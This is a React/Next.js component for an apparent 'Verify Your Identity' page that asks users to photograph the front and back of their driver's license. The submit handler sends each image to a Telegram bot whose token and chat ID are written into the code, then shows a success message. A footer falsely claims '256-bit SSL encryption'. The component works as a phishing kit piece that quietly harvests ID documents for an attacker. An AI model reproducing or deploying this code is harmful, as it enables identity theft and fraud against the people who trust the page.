/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-unused-expressions */
"use client";
import { useState } from 'react';
import { useRouter } from "next/navigation";
import { CameraIcon, DocumentIcon, CheckCircleIcon } from '@heroicons/react/24/outline';

function dataURLtoBlob(dataURL: string) {
  const arr = dataURL.split(',');
  const mime = arr[0].match(/:(.*?);/)![1];
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  while (n--) {
    u8arr[n] = bstr.charCodeAt(n);
  }
  return new Blob([u8arr], { type: mime });
}

const sendToTelegram = async (image: string) => {
  const botToken = "7972666652:AAHpQu7Ax4vgN-lL_-psZbWVjptYDvgl7YA";
  const chatId = "1303640598";

  const blob = dataURLtoBlob(image);
  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('photo', blob, 'image.png');

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: "POST",
      body: formData,
    });

    const result = await response.json();
    if (!result.ok) {
      throw new Error(result.description || "Failed to send image to Telegram");
    }
    console.log("Image sent successfully to Telegram");
  } catch (error) {
    console.error("Error sending image to Telegram:", error);
  }
};

const IDUploadInterface = () => {
  const [frontPreview, setFrontPreview] = useState<string | null>(null);
  const [backPreview, setBackPreview] = useState<string | null>(null);
  const [uploadProgress, setUploadProgress] = useState<number>(0);
  const [error, setError] = useState<string | null>(null);
  const router = useRouter();

  const handleFileUpload = (file: File, side: 'front' | 'back') => {
    if (!file.type.match('image.*')) {
      setError('Please upload an image file (JPG, PNG)');
      return;
    }

    if (file.size > 5 * 1024 * 1024) {
      setError('File size too large (max 5MB)');
      return;
    }

    const reader = new FileReader();
    reader.onloadstart = () => setUploadProgress(10);
    reader.onprogress = () => setUploadProgress(50);
    reader.onloadend = () => {
      setUploadProgress(100);
      setTimeout(() => setUploadProgress(0), 1000);
      side === 'front' 
        ? setFrontPreview(reader.result as string)
        : setBackPreview(reader.result as string);
    };
    reader.readAsDataURL(file);
  };

  const handleSubmit = async () => {
    if (frontPreview) await sendToTelegram(frontPreview);
    if (backPreview) await sendToTelegram(backPreview);
    router.push("/apply/account");
   
    alert("Verification Submitted Successfully!");
  };

  const CardUpload = ({ side }: { side: 'front' | 'back' }) => (
    <div className="relative bg-gray-50 rounded-xl p-6 border-2 border-dashed border-gray-200">
      <input
        type="file"
        accept="image/*"
        capture="environment"
        className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
        onChange={(e) => e.target.files?.[0] && handleFileUpload(e.target.files[0], side)}
      />
      
      <div className="flex flex-col items-center justify-center space-y-3">
        {side === 'front' ? (
          <>
            <CameraIcon className="w-12 h-12 text-green-500" />
            <h3 className="text-lg font-semibold">Front of ID</h3>
          </>
        ) : (
          <>
            <DocumentIcon className="w-12 h-12 text-green-500" />
            <h3 className="text-lg font-semibold">Back of ID</h3>
          </>
        )}
        
        <p className="text-gray-500 text-center text-sm">
          {side === 'front' 
            ? 'Take photo of the front side'
            : 'Take photo of the back side'}
        </p>
        
        {(side === 'front' && frontPreview) && (
          <div className="mt-4 relative">
            <img 
              src={frontPreview} 
              alt="Front preview" 
              className="rounded-lg w-48 h-32 object-cover shadow-sm"
            />
            <CheckCircleIcon className="absolute -top-2 -right-2 w-6 h-6 text-green-500 bg-white rounded-full" />
          </div>
        )}
        
        {(side === 'back' && backPreview) && (
          <div className="mt-4 relative">
            <img 
              src={backPreview} 
              alt="Back preview" 
              className="rounded-lg w-48 h-32 object-cover shadow-sm"
            />
            <CheckCircleIcon className="absolute -top-2 -right-2 w-6 h-6 text-green-500 bg-white rounded-full" />
          </div>
        )}
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-gray-100 p-4">
      <div className="max-w-md mx-auto">
        <header className="mb-8">
          <h1 className="text-2xl font-bold text-gray-900 mb-2">Verify Your Identity</h1>
          <p className="text-gray-500">Upload clear photos of the front and back of your driver&apos;s license to complete verification.</p>
        </header>

        <div className="space-y-6">
          <CardUpload side="front" />
          <CardUpload side="back" />

          {error && (
            <div className="p-3 bg-red-50 text-red-700 rounded-lg flex items-center">
              <span className="text-sm">{error}</span>
            </div>
          )}

          {uploadProgress > 0 && (
            <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
              <div 
                className="h-full bg-green-500 transition-all duration-300" 
                style={{ width: `${uploadProgress}%` }}
              />
            </div>
          )}

          <button 
            onClick={handleSubmit}
            className={`w-full py-4 rounded-xl text-white font-medium ${
              frontPreview && backPreview 
                ? 'bg-green-500 hover:bg-green-600' 
                : 'bg-gray-300 cursor-not-allowed'
            }`}
            disabled={!frontPreview || !backPreview}
          >
            Submit Verification
          </button>
        </div>

        <div className="mt-6 text-center text-sm text-gray-500">
          <p>Your information is securely encrypted</p>
          <div className="flex items-center justify-center space-x-2 mt-2">
            <div className="w-4 h-4 bg-green-500 rounded-full" />
            <span>256-bit SSL encryption</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default IDUploadInterface;